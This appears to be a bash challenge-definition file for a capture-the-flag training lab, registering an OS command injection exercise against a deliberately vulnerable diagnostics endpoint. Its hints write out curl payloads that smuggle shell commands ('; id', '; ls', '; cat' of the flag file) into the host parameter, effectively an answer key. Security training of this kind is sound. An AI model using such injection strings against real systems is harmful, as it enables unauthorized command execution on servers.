#!/usr/bin/env bash
# =============================================================================
#  Medium - Command Injection: Diagnostics Tool   (REAL CoLab app, toolkit)
#  CoLab's network-diagnostics tool interpolates the `host` parameter straight
#  into a shell command (getent) - so a shell metacharacter runs the attacker's
#  own commands on the server. A flag file sits in the tool's working directory,
#  discoverable and readable via injected commands. Embedded by patch_cmdinj.rb.
#  NOTHING is handed to the player - they inject the command themselves.
# =============================================================================

cmdinj_provision() { return 0; }   # controller + flag file baked into the app image

cmdinj_toolkit() {
  local id="$1"
  toolkit_install_helper "$id" "NOTES.txt" \
"# Recon notes - CoLab network diagnostics:
#     GET /api/netcheck?host=<host>   -> resolves a host on the server
# The server-side flag is a FILE in the tool's working directory - once you can
# run commands, list the directory and read it. Tools: curl."
}

register_challenge \
  id="med-cmdinj" \
  title="Command Injection: Diagnostics Tool - Medium" \
  diff="Medium" points="250" \
  owasp="A03:2021 Injection (OS Command)" \
  cvss="8.8 (AV:N/PR:N/C:H/I:H)" \
  slug="cmd_injection_netcheck" \
  finding="CoLab Pentest Report - diagnostics host parameter passed unsanitised to a shell (OS command injection)" \
  endpoint="GET /api/netcheck?host=<host>" \
  tools="curl" \
  scenario="CoLab has a network-diagnostics tool that resolves a host you supply. It builds the shell command by pasting your 'host' value straight in - so a shell metacharacter runs your own commands on the server. A flag file sits in the tool's working directory." \
  objective="Inject a shell command through the diagnostics tool, discover the flag file on the server, and read it." \
  remediation="Never build shell commands from user input; call the resolver via a library, or exec with an argument array (no shell); validate/allow-list the host." \
  hints="Run a normal lookup (host=localhost), then append a shell command separator and a second command - URL-encode it:  curl -G http://app:3000/api/netcheck --data-urlencode 'host=localhost; id'  - do you see the output of id?
List the tool's working directory to find the flag file:  --data-urlencode 'host=localhost; ls'
Read the flag file it reveals:  --data-urlencode 'host=localhost; cat cmdinj_flag.txt'" \
  provision="cmdinj_provision" toolkit="cmdinj_toolkit" handler=""
